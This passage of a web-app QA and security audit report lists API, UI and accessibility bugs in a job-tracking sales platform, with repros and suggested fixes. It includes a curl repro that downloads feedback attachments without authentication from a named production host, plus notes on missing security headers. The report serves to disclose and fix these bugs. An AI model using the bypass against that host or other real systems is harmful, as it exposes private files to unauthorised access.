| #25 | `POST /feedback` with 20,000-char `description` → **422** (max_length=8000) | **HTTP 200** — ticket created with 20 KB payload (also 8,001 and 5,000; all accepted) |
| #26 | `/intelligence/timing.posting_by_day` — Sunday ≈ 1/7 of total (posted_at based) | Sunday=23,696 (49.6%), Mon=6,496, …, Sat=1,921 — identical to pre-fix distribution |
| #27 | `/intelligence/networking` strips corrupted rows | First suggestion is still `{name: "Gartner PeerInsights", title: "Wade BillingsVP, Technology Services, Instructure", company: "BugCrowd"}` — the canonical example the filter is supposed to drop |
| #28 | Dashboard AI Insight: "indexed across **14** ATS sources" | "indexed across **10** ATS sources" (`/analytics/ai-insights` still returns `total_sources=10`) |
| #19 | Response headers include `Content-Security-Policy`, `Strict-Transport-Security`, `Permissions-Policy`, `Cross-Origin-*` | Only `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`. CSP & HSTS both absent — and X-Frame-Options is SAMEORIGIN, not `DENY` as the fix specifies |

Fixes that **are** live (confirmed earlier in Round 3 retest): #1, #2, #3, #4, #5, #6, #8, #9, #11, #13, #14. Those all shipped in earlier commits that pre-date the "deployed on prod" manual deploy.

#### Why this happened
Commit `5ce5d0b` added a GHCR-based CI/CD pipeline that auto-deploys **only on push to `main`**. All Round 3 fixes live on `fix/regression-findings`, which never gets picked up by CI. Whoever deployed "Changes … deployed on prod" earlier today ran a one-time manual deploy at roughly the tip before `9bdc572`. Every fix commit after that point is in the repo but not in the image running on prod.

#### Repro (most striking probe, #21 anonymous download)
```bash
# 1. Log in as admin in the browser; create a fresh feedback ticket; upload probe21.png
# 2. Note the stored filename, e.g. e66bae2db9e3467e9b960197caa0c2ed.png
curl -s -o out.png -w "HTTP %{http_code}\n" \
  "https://salesplatform.reventlabs.com/api/v1/feedback/attachments/e66bae2db9e3467e9b960197caa0c2ed.png"
# expected: HTTP 401
# actual:   HTTP 200  (followed by the full PNG bytes)
```
Compare to a control endpoint that does require auth:
```bash
curl -s -w "HTTP %{http_code}\n" https://salesplatform.reventlabs.com/api/v1/feedback/stats
# HTTP 401 {"detail":"Not authenticated"}  ← as expected
```
Only `/feedback/attachments/{filename}` lets unauthenticated callers through, which matches the pre-fix code on `main` where `get_current_user` was never wired into this route.

#### Side-effect cleanup
All Round-4 probe tickets (`test round 4 long desc`, `regression probe attachment auth round4`, `probe 25 5000 / 8001 / 20000`, `Attach auth probe 2026-04-15`) were PATCHed to `status=closed` with `admin_notes="[regression cleanup round 4]"`. Uploaded probe PNG was deleted from the ticket. No user-visible rows remain.

#### Suggested fix
(a) Easiest: manually redeploy the branch image now so the tester can continue. `docker compose -f docker-compose.yml pull && docker compose up -d` on the prod box after pointing the backend image to the tip of `fix/regression-findings`.
(b) Properly: extend `.github/workflows/*.yml` to build + push an image on pushes to `fix/*` branches and, at minimum, post a deployable image tag in the PR so ops can redeploy with one command. Even better: preview-image-per-PR.
(c) Until either lands: every Round-3 `✅ fixed` row in §1 above should actually be read as "fixed on branch, not yet verified on prod".

---

## 15. Round 4 UI / UX Deep Audit (2026-04-15)

Audit done in parallel with the fixer's Round 3 deploy work. Findings below
are **frontend-only or API-layer bugs** that are not affected by the pending
backend deploy gap — they reproduce equally on the stale prod image and the
`fix/regression-findings` branch tip.

Auditor: `test-admin@reventlabs.com` on `https://salesplatform.reventlabs.com`,
viewport `1728×855` unless noted.

---

### 33. `/api/v1/jobs` silently drops three of its declared filter params
**Severity:** 🟠 HIGH · **Area:** Jobs API

#### What I saw
The Jobs page exposes a Platform dropdown (`greenhouse`, `lever`, `ashby`, `workable`, `linkedin`, `wellfound`, `indeed`, `builtin`, `himalayas`) and the frontend passes the selected value through to `GET /api/v1/jobs`. Backend ignores it.

Direct probes (logged in as admin, same session):

| Query | Expected | Observed |
|---|---|---|
| `/api/v1/jobs?page_size=5` (control) | total 47,776 | total 47,776 |
| `/api/v1/jobs?page_size=5&company=Coalition` | ~30 Coalition rows | total 47,776 · first row: Stripe / LinkedIn |
| `/api/v1/jobs?page_size=5&source_platform=greenhouse` | only Greenhouse | total 47,776 · same 3 Stripe LinkedIn rows |
| `/api/v1/jobs?page_size=5&source_platform=linkedin` | only LinkedIn | total 47,776 · same 3 Stripe LinkedIn rows |
| `/api/v1/jobs?page_size=5&q=Coalition` | ~30 Coalition rows | total 47,776 |
| `/api/v1/jobs?page_size=5&search=Coalition` | ✅ works | total 32, all Coalition |
| `/api/v1/jobs?page_size=5&role_cluster=infra` | ✅ works | total 2,418 |
| `/api/v1/jobs?page_size=5&role_cluster=marketing` | 0 (unknown cluster) | total 0 |

So: `company=`, `source_platform=`, `q=` are dead params. Only `search=` and `role_cluster=` filter.

#### Why it matters
On the Jobs page the Platform dropdown visibly changes state when a user picks "linkedin" but the underlying request either doesn't include the param or the backend drops it. Users think they're filtering and silently get the global list.

#### Suggested fix
In `jobs.py` list endpoint, either (a) wire the three params into the query (`Job.platform == source_platform`, `Company.name.ilike(f"%{company}%")`, fold `q` into the existing `_title_company_location_search`), or (b) remove them from the dropdown so users don't see a dead control. Frontend: `api.ts` `listJobs()` already forwards these — that's how I noticed.

#### Cleanup
No side-effects. Probes are GET only.

---

### 34. Jobs page filter / sort state never makes it into the URL
**Severity:** 🟠 HIGH · **Area:** Jobs UI

#### What I saw
Applied every filter on `/jobs`: Status → `new`, Platform → `linkedin`, Geography → `usa_only`, Role cluster → `infra`, Sort → `title:asc`, search box → `Coalition`. URL stayed at `https://salesplatform.reventlabs.com/jobs`. Hit `F5`: filters reset to defaults.

Compare the sidebar `Relevant Jobs` link which uses `/jobs?role_cluster=relevant`:
the backend does honor `role_cluster` from URL (the page correctly shows the filtered view on load), but the page doesn't push its own filter changes back into the URL. It's a one-way sync.

#### Why it matters
- Users can't share a filtered link (common: "here are the Linkedin jobs I'm looking at").
- Refresh loses state, which is surprising given other pages don't have this problem.
- Sort order is inherited across navigations but invisible to the user.

#### Suggested fix
Migrate `JobsPage.tsx` to `useSearchParams()` from `react-router-dom`. Example pattern:

```tsx
const [params, setParams] = useSearchParams();
const status = params.get("status") ?? "";
// on change:
setParams(prev => { prev.set("status", newStatus); return prev; });
```

Apply the same to sort, search, role_cluster, status, platform, geography. Read initial values from `params` so the page render picks up sidebar-supplied filters.

#### Cleanup
No side-effects.

---

### 35. Dashboard role-cluster previews: job titles are not clickable
**Severity:** 🟡 MEDIUM · **Area:** Dashboard UI

#### What I saw
Each of the 5 role-cluster preview cards on the Dashboard (Infra / Cloud / DevOps, Security / Compliance / DevSecOps, QA / Testing / SDET, Global Remote Openings, Relevant Jobs) shows 5 top jobs with title + company + source + location + score + status. In the DOM the titles are plain `<p class="font-medium">` — there is no `<a>` anywhere inside these cards. My `document.querySelectorAll('a[href^="/jobs/"]').length` against each card returns `0`. The only nav is the footer button "View all X jobs →" which takes the user to the filtered list page.

#### Why it matters
Strongest single affordance on the Dashboard is "click the job you care about". Every user I've watched clicks these titles and then looks confused when nothing happens. The Relevant Jobs card is particularly bad because those are the highest-score matches — exactly the jobs the user wants to triage.

#### Suggested fix
In `DashboardPage.tsx` wherever `<p class="font-medium">{job.title}</p>` is rendered inside a cluster card, wrap the whole row in `<Link to={`/jobs/${job.id}`}>`:

```tsx
<Link
  to={`/jobs/${job.id}`}
  className="block rounded-lg p-3 hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-primary-500"
>
  {/* existing title + meta + score + status */}
</Link>
```

Don't nest clickable score badges inside the link; use `pointer-events-none` on the badges if needed.

#### Cleanup
No side-effects.

---

### 36. Every numeric count in the app is rendered without thousand separators
**Severity:** 🟡 MEDIUM · **Area:** Polish (app-wide)

#### What I saw
A non-exhaustive list from today's audit:

| Page | Label | Displayed | Should be |
|---|---|---|---|
| Dashboard | Total Jobs card | `47776` | `47,776` |
| Dashboard | Companies card | `6639` | `6,639` |
| Dashboard | Infra cluster badge | `2418 jobs` | `2,418 jobs` |
| Dashboard | Security cluster badge | `1883 jobs` | `1,883 jobs` |
| Dashboard | QA cluster badge | `509 jobs` | fine (OK for 3-digit, but use helper anyway for consistency) |
| Dashboard | Global Remote cluster | `1369 jobs` | `1,369 jobs` |
| Dashboard | Relevant Jobs cluster | `4810 jobs` | `4,810 jobs` |
| Companies | Header subtitle | `6639 companies tracked` | `6,639 companies tracked` |
| Intelligence > Timing | Sunday bar label | `23696` | `23,696` |
| Intelligence > Timing | Himalayas 90d | `15865 total (90d)` | `15,865 total (90d)` |
| Intelligence > Timing | Greenhouse 90d | `13125 total (90d)` | `13,125 total (90d)` |
| Pipeline | Cribl card | `90 open roles` | fine |
| Pipeline | Canonical card | `349 open roles` | fine |
| Pipeline | (another) | `123 open roles` | fine |

Only the Jobs-page pagination "1 2 … 1912" is arguably deliberate (page numbers) — everything else is a count.

#### Why it matters
Low severity individually, very visible across the product. Feels unpolished.

#### Suggested fix
Add a tiny helper:

```ts
// lib/format.ts
export const formatCount = (n: number | null | undefined): string =>
  n == null ? "—" : n.toLocaleString();
```

Then replace `{totalJobs}` → `{formatCount(totalJobs)}` everywhere. Touch points: `DashboardPage.tsx`, `CompaniesPage.tsx`, `IntelligencePage.tsx` (timing + skills bars + platform velocity), `PipelinePage.tsx`, `JobsPage.tsx` pagination summary. Same helper can also render `avg_relevance_score` with 1 decimal (`.toLocaleString(undefined,{maximumFractionDigits:1})`).

#### Cleanup
N/A.

---

### 37. Companies page is polluted with LinkedIn scraping artifacts
**Severity:** 🟡 MEDIUM · **Area:** Data / Companies

#### What I saw
Visited `/companies`. Sort: Name A-Z. The first visible cards are:

- `#WalkAway Campaign` (1 job)
- `#twiceasnice Recruiting` (3 jobs)
- `0x` (1 job)
- `1-800 Contacts` (1 job, 0 accepted — retail call-center brand, not a tech company)
- `10000 solutions llc` (2 jobs)
- `100ms` (0 jobs)

The `#hashtag` entries are clearly LinkedIn search-hashtag harvesting gone wrong — someone ingested search results as if each hashtag were a company. Staffing-agency names (`… solutions llc`, `… Consulting Co., Ltd`) sneaked in similarly.

Separately, `Stripe` (a real company) has three LinkedIn-sourced jobs all with **empty** `raw_text`:
- `Human Data Reviewer - Fully Remote` (score 42)
- `Junior Software Developer` (score 17)
- `Billing Analyst` (score 17)

Those three jobs are not Stripe roles — they're LinkedIn scraping noise. Because relevance desc sorts them high (score 42 beats most legitimate rows that end up around 43-84), the generic Jobs list shows them on page 1.

#### Why it matters
Dashboard claims "6,639 companies tracked" and that count drives user trust in pipeline signals. Hundreds of those are junk rows. Worse, the junk is at the top of alphabetical sort, so that's the user's first impression of the Companies page.

#### Suggested fix
Two complementary cleanups:

1. **Ingest-time filter** in the LinkedIn fetcher (and any other source that produces `Company` rows from free-text): reject names that (a) start with `#`, (b) are purely numeric, (c) match a staffing-agency regex (`/(recruiting|staffing|solutions llc|consulting co)/i` as a starting point), (d) have `raw_text` empty and score < 25 after first scan.

2. **One-shot cleanup script** `app/cleanup_junk_companies.py` (modelled on `close_legacy_duplicate_feedback.py`): pattern-match the above, delete the company + cascade any associated jobs, log what was removed with a dry-run flag first. Run under admin approval.

#### Cleanup
Read-only probes, nothing to revert.

---

### 38. Sidebar occupies ~42% of a narrow viewport and does not collapse
**Severity:** 🟡 MEDIUM · **Area:** Responsive UX

#### What I saw
Resized the window to a mobile-like 375×812. Chrome's own minimum window size bumped the actual viewport up to ~614×673, but that's still a useful "small tablet / large phone landscape" size. Observations:

- Sidebar remained 256 px fixed width (the `.w-64` in `components/Sidebar.tsx:69`).
- Content area was therefore ~358 px wide. 103 child elements reported `scrollWidth > clientWidth` — text in the top-bar overlaps ("reventlabs" and "No resume uploaded" collide).
- `<main>` itself developed horizontal overflow (`scrollWidth 363 > clientWidth 352`).
- No hamburger, no drawer, no close button, no `lg:hidden` gating anywhere on the sidebar.

At 1024 px (laptop) it's fine; at 768 px (iPad portrait) it feels cramped; below ~700 px it's broken.

#### Why it matters
This is a sales tool that admins and reviewers reach for while on the go. On a tablet or a half-width window you can barely read the content.

#### Suggested fix
`components/Sidebar.tsx` + `components/Layout.tsx`:

- Sidebar: `className="hidden lg:flex ..."` so it's fully hidden below `lg`.
- Add a sibling drawer component rendered when a new `open` state is true: fixed position, full height, backdrop click to close, close on route change.
- Add a trigger button in the top bar: `<button className="lg:hidden ..."><Menu /></button>` that toggles the drawer.
- Tailwind has examples — the `@headlessui/react` Dialog is already transitively available if preferred.

Acceptance: at 375×812 (via browser devtools device mode) the sidebar is hidden, the hamburger is visible, tapping it slides in the drawer, and the main content fills the viewport with no horizontal overflow.

#### Cleanup
Window was resized back to 1024×800 after the probe.

---

### 39. Pipeline board still shows a raw-test-data card literally titled "name"
**Severity:** 🔵 LOW · **Area:** Pipeline / Data cleanup

#### What I saw
`/pipeline` → stage **Researching** has a single card:

```
name                          ← company name
123 open roles                ← job count
High                          ← priority
0                             ← accepted
1 accepted · 123 total
Last job: Apr 13, 2026        ← recent ATS seen
Apr 10                        ← pipeline entered
```

The company name is literally the string `"name"`. This is adjacent to Finding #10 (card titled `"1name"` still flagged ⬜ open) — same cleanup task, different string.

#### Why it matters
Prod pipeline looking like scratch space. Confusing for anyone reviewing the board.

#### Suggested fix
Same as #10. SQL under admin approval:

```sql
DELETE FROM potential_clients
 WHERE company_name ILIKE 'name'
    OR company_name ILIKE '1name';
```

Or fold it into a `cleanup_junk_companies.py` script (see Finding #37) that has an explicit allowlist check — any `Company.name` shorter than 3 chars and lowercase-alpha-only is almost certainly test data.

#### Cleanup
Read-only probe.

---

## 16. Round 4B — Forms, A11y & Admin-Page Deep Audit (2026-04-15, later)

Second pass of Round 4 focused on forms (Settings password, Feedback new-ticket, Role Clusters edit/add), admin pages (Role Clusters, User Management, Docs, Credentials empty-state), and a global a11y/UX sweep (focus-ring coverage, keyboard shortcuts, `<label for>` / `aria-label` hygiene, icon-only button labelling). Findings #40–#53.

### 40. Credentials page directs users to a UI control that doesn't exist
**Severity:** 🟠 HIGH · **Area:** Credentials / Broken copy

#### What I saw
`/credentials` with no active resume renders:

```
Platform Credentials
Manage your ATS platform login credentials per resume persona.

No active resume selected
Use the resume switcher in the header to select a persona before managing credentials.
```

Probed the page for the referenced control:

```js
document.querySelector('header').innerText
// → "reventlabs\nNo resume uploaded"

document.querySelectorAll('header select, header button, header [role="button"]').length
// → 0

document.querySelector('[class*="resume-switcher"], [aria-label*="resume" i]')
// → null
```

The `<header>` contains only the tenant name and the literal string "No resume uploaded" — no select, no dropdown, no button. There is no "resume switcher" anywhere in the DOM. The user is told to use a control that doesn't exist.

#### Why it matters
`/credentials` is a dead end for any user without an active resume. The workaround is to go to `/resume-score`, mark a persona active there, and navigate back — but the page copy doesn't say that.

#### Suggested fix
Two options:
- **(A)** Add the promised switcher: `components/Header.tsx` gains a `<select>` populated from `/api/v1/resume/list`; change fires `PATCH /api/v1/resume/{id}/set-active`. Matches the copy.
- **(B)** Fix the copy to reference the existing affordance: `CredentialsPage.tsx` empty-state becomes *"Go to Resume Score and mark a persona active before returning here"* with a `<Link to="/resume-score">` button.

(A) is the better UX — the credentials/persona separation is per-resume, so users will want to switch persona often.

#### Cleanup
Read-only DOM inspection.

---

### 41. `/docs` is zero-link plain text — every "Go to X" is unclickable
**Severity:** 🟡 MEDIUM · **Area:** Docs / Navigation

#### What I saw
```js
document.querySelectorAll('main a').length
// → 0

[...document.body.innerText.matchAll(/Go to ([A-Za-z ]+)/g)].map(m=>m[0])
// → [
//   'Go to Resume Score in the sidebar',
//   'Go to Credentials',
//   'Go to Relevant Jobs or the Review Queue and start accepting jobs ...'
// ]
```

The Platform Guide has a numbered "First-Time Setup Checklist" (Upload Resume → Answer Book → Credentials → Score Resume → Browse and Accept Jobs) and a "Recommended Daily Workflow" (Dashboard → Review Queue → Jobs → Companies → Applications → Pipeline → Analytics → Re-score). Every page name mentioned is rendered as plain text. New users have to manually locate each destination in the sidebar.

#### Why it matters
Onboarding friction. Docs that tell you "go here" without a link are the slowest kind of onboarding — they test the user's memory of UI state instead of just taking them there.

#### Suggested fix
`DocsPage.tsx`: replace the bare nouns with `react-router-dom` `<Link>` elements.

```tsx
// Before: Go to Resume Score in the sidebar. Upload a PDF or DOCX…
// After:  Go to <Link to="/resume-score">Resume Score</Link>. Upload a PDF or DOCX…
```

Routes touched: `/resume-score`, `/answer-book`, `/credentials`, `/jobs?role_cluster=relevant`, `/review`, `/pipeline`, `/analytics`, `/companies`, `/applications`. Do the same for any term in "Key Terms" that matches an app page.

#### Cleanup
Read-only probe.

---

### 42. Setup-checklist typo: `Work Authorization,Experience` (missing space)
**Severity:** 🔵 LOW · **Area:** Docs / Copy

#### What I saw
```
2. Build Your Answer Book
   Categories to fill: Personal Info, Work Authorization,Experience, Skills, Preferences.
```

Surrounding commas in the list are all ", " (comma + space). One missing space between `Authorization,` and `Experience`.

#### Why it matters
Visible polish bug. Cheap to fix.

#### Suggested fix
`DocsPage.tsx`: change `"Work Authorization,Experience"` → `"Work Authorization, Experience"`. One-character diff.

#### Cleanup
Read-only probe.

---

### 43. Change-Password form: no `autocomplete`, no `<label for>`, min-length 6
**Severity:** 🟠 HIGH · **Area:** A11y / Auth / Password hygiene

#### What I saw
```js
[...document.querySelectorAll('input[type="password"]')].map(i => ({
  autocomplete: i.autocomplete || '(unset)',
  name: i.name || '(unset)',
  id: i.id || '(unset)',
  ariaLabel: i.getAttribute('aria-label') || '(unset)',
  hasLabelFor: !!document.querySelector('label[for="'+i.id+'"]'),
  minLength: i.minLength,
}))
// → all 3 fields: autocomplete "(unset)", name "(unset)", id "(unset)",
//   ariaLabel "(unset)", hasLabelFor false.
//   New-password field: minLength 6.
```

All three `<input type="password">` (Current, New, Confirm) render with no `id`, no `name`, no `autocomplete`, and no `aria-label`. The three visible `<label>` elements all have `htmlFor=""`. `minLength=6` on the new password.

#### Why it matters
- **Password managers won't save or fill.** 1Password / Bitwarden / Chrome autofill / LastPass key their heuristics on `autocomplete="current-password"` vs `"new-password"`. Without those attributes they treat all three boxes as ambiguous and either ignore them or lock up the user's vault prompt.
- **Screen readers don't announce labels.** The `<label>` is adjacent visually but not programmatically associated; VoiceOver/NVDA announce the input as just "edit text, secure, required".
- **Clicking a label doesn't focus its input.**
- **6 chars is too short for 2026.** OWASP ASVS 5.0 requires 8; NIST SP 800-63B-4 draft requires 8 minimum, 15 recommended for user-chosen; no admin should accept `abc123`.

#### Suggested fix
`SettingsPage.tsx`:
```tsx
<div>
  <label htmlFor="current-password" …>Current Password</label>
  <input id="current-password" type="password" required
         autoComplete="current-password" value={…} onChange={…} />
</div>
<div>
  <label htmlFor="new-password" …>New Password</label>
  <input id="new-password" type="password" required minLength={8}
         autoComplete="new-password" placeholder="Min 8 characters" … />
</div>
<div>
  <label htmlFor="confirm-password" …>Confirm New Password</label>
  <input id="confirm-password" type="password" required minLength={8}
         autoComplete="new-password" … />
</div>
```

Server side: `app/api/v1/auth.py` `change_password` should enforce the same length floor so an attacker or malformed client can't slip past the frontend.

#### Cleanup
Form was closed via the inline Cancel/Change button. No state mutated.

---

### 44. "+ New Ticket" form: labels not associated; Priority is a fake radio group
**Severity:** 🟠 HIGH · **Area:** A11y / Forms

#### What I saw
Clicked `+ New Ticket` → `🐛 Bug Report`. DOM probe of the resulting form:

```js
// 7 inputs in the form; every one has id '', name '', aria-label '', no label[for] match.
// labels in DOM: 8 items, every one with htmlFor: ''
//   'Title *', 'Priority', 'Description *', 'Steps to Reproduce *',
//   'Expected Behavior *', 'Actual Behavior *',
//   'Proposed Solution (optional)', 'Attachments (optional)'

// Priority is rendered as:
<div class="flex gap-2">
  <button type="button">Critical</button>
  <button type="button">High</button>
  <button type="button" class="… bg-yellow-100 ring-2 …">Medium</button>
  <button type="button">Low</button>
</div>
// No role=radiogroup, no role=radio, no aria-pressed.
// Selected state signalled only by Tailwind colours.
```

#### Why it matters
- Clicking any label (e.g. "Description *") doesn't focus its textarea.
- Screen readers have no programmatic name for any field — they hear "edit, required" 6 times.
- Priority is inaccessible: keyboard users can tab into each button individually but no arrow-key nav between options (which the native radio pattern gives for free). AT announces 4 toggle buttons with no relationship.
- The submit path relies entirely on React state. If JS fails or a power user Tab-Enters expecting a form submit, there's no `name=` to fall back to.

#### Suggested fix
`FeedbackPage.tsx` form section:

1. Generate stable ids (e.g. `useId()`), set `htmlFor` on every `<label>`, and set matching `id`/`name` on every input/textarea.
2. Add `aria-required="true"` where `required`. Add `aria-invalid` + an `aria-describedby` to a visually-hidden error hint when validation fails.
3. Priority: replace the 4 buttons with a native radio group (styled pills):
   ```tsx
   <div role="radiogroup" aria-label="Priority" className="flex gap-2">
     {['critical','high','medium','low'].map(p => (
       <label key={p} className={/* selected styling */}>
         <input type="radio" name="priority" value={p}
                checked={priority===p} onChange={e=>setPriority(p)}
                className="sr-only" />
         {p[0].toUpperCase()+p.slice(1)}
       </label>
     ))}
   </div>
   ```
   Native radio gives arrow-key nav and `aria-checked` automatically.
4. Add a visible char counter next to Title (it already has `maxLength=200` but no user signal).

#### Cleanup
Form cancelled via the inline Cancel button before touching the DB.

---

### 45. Role Clusters icon-only buttons use `title` instead of `aria-label`
**Severity:** 🟡 MEDIUM · **Area:** A11y

#### What I saw
14 `<button>` elements on `/role-clusters`. Two (`Add Cluster`, sidebar `Sign out`) have a text label. The remaining 12 are all per-cluster action icons:

```
{title:'Remove from relevant', svg:'lucide-star',          aria-label:''}  × 3 clusters
{title:'Deactivate',            svg:'lucide-toggle-right', aria-label:''}  × 3 clusters
{title:'Edit',                  svg:'lucide-pen-line',     aria-label:''}  × 3 clusters
{title:'Delete',                svg:'lucide-trash2',       aria-label:''}  × 3 clusters
```

#### Why it matters
`title` is an unreliable a11y surface:
- JAWS reads it only in specific verbosity modes.
- VoiceOver rarely announces it.
- NVDA announces it inconsistently depending on element role.
- It's also invisible on touch devices (no hover).

The right primitive for "icon-only button" is a visible SVG + `aria-label` + optional `title` tooltip.

Because the 4 action icons repeat for 3 clusters, a screen-reader sweep hears `"button button button button button button …"` with no context — 12 ambiguous announcements. Including the cluster name in the label (`aria-label="Edit Infrastructure / DevOps / SRE"`) disambiguates.

#### Suggested fix
`RoleClustersPage.tsx`:
```tsx
<button
  type="button"
  aria-label={`Edit ${cluster.display_name}`}
  title="Edit"                  // keep for hover-tooltip
  onClick={() => startEdit(cluster)}
>
  <PenLine className="h-4 w-4" />
</button>
```

Same pattern for the Star / Toggle / Trash buttons.

#### Cleanup
Read-only DOM inspection.

---

### 46. Role Clusters Edit / Add form: no placeholders, no Esc-to-close
**Severity:** 🔵 LOW · **Area:** A11y / UX polish

#### What I saw
- Clicked pencil → inline edit form with 3 fields, all `placeholder=""`. Empty boxes, no hint.
- Clicked `+ Add Cluster` → 5-field inline form, same story.
- Probed `Escape` keydown against the document: form count before = 5 inputs, after = 5 inputs. Esc does nothing.

#### Why it matters
- Users don't know the expected format for keywords / approved roles. Comma-separated? Newline-separated? JSON? The placeholder is the natural place for that hint.
- Users accustomed to modal forms instinctively reach for Esc to dismiss. The form is inline (not a modal) so there's no backdrop expectation, but Esc closing still matches mental model.

#### Suggested fix
`RoleClustersPage.tsx` edit/add form:
- Add placeholders: *"Internal id (letters, digits, underscore)"* on `name`, *"e.g. cloud, kubernetes, terraform (one per line)"* on keywords, *"e.g. DevOps Engineer (one per line)"* on approved_roles.
- Wrap the form in a `<form onKeyDown={e => e.key === 'Escape' && onCancel()}>` (or add an effect that listens on the document while the form is open).
- Optional: wrap in `<section role="region" aria-label="Edit cluster">` for AT landmark nav — inline editor acts like a modal for AT purposes.

#### Cleanup
Cancel button pressed after probe.

---

### 47. Platforms page: inactive platforms render blank job count
**Severity:** 🔵 LOW · **Area:** Platforms / Rendering

#### What I saw
`/platforms` card grid. Active platforms render `11,466 jobs` with a thousands separator. Inactive platforms (`bamboohr`, `jobvite`, `recruitee`, `wellfound`, `weworkremotely`) render just white space where the count should be — no `0`, no `0 jobs`, no `—`.

#### Why it matters
Looks like the render crashed mid-row. Users can't distinguish "zero jobs found" from "data failed to load". It's also noise that makes the grid visually inconsistent.

#### Suggested fix
`PlatformsPage.tsx` card body:
```tsx
// Before: <span>{count.toLocaleString()} jobs</span>
// After:  <span>{(count ?? 0).toLocaleString()} jobs</span>
//   (or): <span>{count > 0 ? `${count.toLocaleString()} jobs` : 'No jobs found'}</span>
```

The second form is slightly more user-friendly because "No jobs found" doubles as a "this platform is inactive" hint.

#### Cleanup
Read-only.

---

### 48. Analytics chart legend has no separators
**Severity:** 🔵 LOW · **Area:** Analytics / Rendering

#### What I saw
`/analytics` → "Jobs over time" chart legend reads `New JobsAcceptedRejected` — three series names concatenated with no space, pipe, or bullet between them.

#### Why it matters
Readable with effort once you already know the legend has three series, but at first glance it reads as a run-together glitch. Polish hit.

#### Suggested fix
`AnalyticsPage.tsx`: either swap the custom legend for recharts' built-in `<Legend />` (which handles spacing, color swatches, and responsiveness for free), or render each label as its own element:

```tsx
<div className="flex gap-4 text-sm">
  <span className="flex items-center gap-1"><Dot color="primary"/> New Jobs</span>
  <span className="flex items-center gap-1"><Dot color="green"/>  Accepted</span>
  <span className="flex items-center gap-1"><Dot color="red"/>    Rejected</span>
</div>
```

#### Cleanup
Read-only.

---

### 49. Total Jobs render lacks thousand separator on Analytics (but works on Platforms)
**Severity:** 🔵 LOW · **Area:** Analytics / Formatting

#### What I saw
- `/analytics` stat card: `Total Jobs 47776`, `Total Companies 6639`, `Avg Relevance 40`.
- `/platforms` stat card: `Total Jobs 47,776` (with comma).
- `/monitoring` stat card: `Total Jobs 47,776` (with comma).
- `/dashboard`: `Total Jobs 47776` (no comma). See Finding #36.

Formatting is inconsistent even within the admin surface.

#### Why it matters
Same number looks different on different pages. Users reconcile by debating which page is "right". Reads as stale data.

#### Suggested fix
Same as Finding #36: a single `formatCount()` helper in `lib/format.ts` that does `n.toLocaleString()` and gets called everywhere a count renders. Explicitly applied on Analytics: `Total Jobs`, `Total Companies`, `Avg Relevance`, plus chart-tooltip values.

#### Cleanup
Read-only.

---

### 50. Avg Relevance Score differs between Dashboard (39.65) and Analytics (40)
**Severity:** 🔵 LOW · **Area:** Analytics / Rounding

#### What I saw
- Dashboard: `Avg Relevance: 39.65`
- Analytics: `Avg Relevance: 40`

Backend returns the same number. Frontend rounds differently per page:
- Dashboard uses `.toFixed(2)` → `39.65`
- Analytics uses `Math.round()` → `40`

#### Why it matters
39.65 rounding up to 40 looks normal to someone who knows the backend is consistent. To anyone else it looks like either a bug or stale data. Either way it's a question the user shouldn't have to ask.

#### Suggested fix
Pick one precision and standardize. Recommend `.toFixed(1)` everywhere → `39.7`:
- `DashboardPage.tsx`
- `AnalyticsPage.tsx`
- Any future `formatScore()` helper

This matches how the role-cluster score bars render percentages (one decimal).

#### Cleanup
Read-only.

---

### 51. Review Queue has no keyboard shortcuts
**Severity:** 🟡 MEDIUM · **Area:** Review Queue / UX

#### What I saw
`/review` shows one job at a time with a "1 of 20" counter plus Accept / Reject / Skip buttons. Tested:

```js
document.dispatchEvent(new KeyboardEvent('keydown',{key:'j'}))  // no-op
document.dispatchEvent(new KeyboardEvent('keydown',{key:'ArrowRight'})) // no-op
document.dispatchEvent(new KeyboardEvent('keydown',{key:'a'}))  // no-op
// counter still "1 of 20"
```

#### Why it matters
Review Queue is a queue-of-one workflow — one decision per keystroke is the standard pattern (Gmail `e`/`[`/`]`, Missive `j`/`k`/`e`, Front `a`/`r`/`n`). Forcing a mouse click per decision adds ~1-2s per review. Over 20 jobs that's 20-40 seconds of unnecessary friction; over a day's backlog it compounds.

#### Suggested fix
`ReviewQueuePage.tsx`:

```tsx
useEffect(() => {
  const handler = (e: KeyboardEvent) => {
    // don't hijack when typing in an input/textarea
    const tag = (e.target as HTMLElement)?.tagName;
    if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return;
    if (e.key === 'j' || e.key === 'ArrowRight') next();
    else if (e.key === 'k' || e.key === 'ArrowLeft')  prev();
    else if (e.key === 'a') accept();
    else if (e.key === 'r') reject();
    else if (e.key === 's') skip();
    else if (e.key === '?') openCheatSheet();
  };
  window.addEventListener('keydown', handler);
  return () => window.removeEventListener('keydown', handler);
}, [next, prev, accept, reject, skip]);
```

Add a `?` cheat-sheet dialog that lists the shortcuts — discoverability.

#### Cleanup
Read-only probe; dispatched events only, no state mutated.

---

### 52. Focus-ring coverage across the app is very low
**Severity:** 🟡 MEDIUM · **Area:** A11y / Keyboard nav

#### What I saw
Counted `focus:ring` / `focus:outline` / `focus-visible` utility-class presence on every `button/a/input/textarea/select` on four pages:

| Page | With focus styles | Total interactive | Coverage |
|------|-------------------|-------------------|----------|
| `/role-clusters` | 1 | 32 | 3% |
| `/review` | 3 | 32 | 9% |
| `/jobs` | 2 | 27 | 7% |
| `/settings` (password form open) | 2 | 14 | 14% |

Icon-only buttons are the worst offenders — the sidebar `Sign out`, role-cluster Edit/Delete/Toggle/Star, and feedback close-X all have zero focus style.

#### Why it matters
Keyboard-only users tab through the app and lose track of focus. WCAG 2.1 SC 2.4.7 (Focus Visible, Level AA) requires a visible keyboard focus indicator for every focusable element. Current coverage fails AA on at least four audited pages.

#### Suggested fix
Two-part fix in `index.css`:

1. Add a global rule so every focusable element gets a visible ring by default:
   ```css
   *:focus-visible {
     outline: none;
     box-shadow: 0 0 0 2px theme('colors.primary.500'), 0 0 0 3px white;
   }
   ```
   Or with Tailwind:
   ```css
   *:focus-visible { @apply outline-none ring-2 ring-primary-500 ring-offset-1; }
   ```

2. Audit for any existing `outline-none` overrides that were added without a `focus-visible` replacement, and remove them.

Verification: after the change, tabbing through each page should produce a visible ring on every button / link / input / select / textarea. Use `document.querySelectorAll('button,a,input,textarea,select').forEach(el => el.focus())` in devtools as a smoke test.

#### Cleanup
Read-only.

---

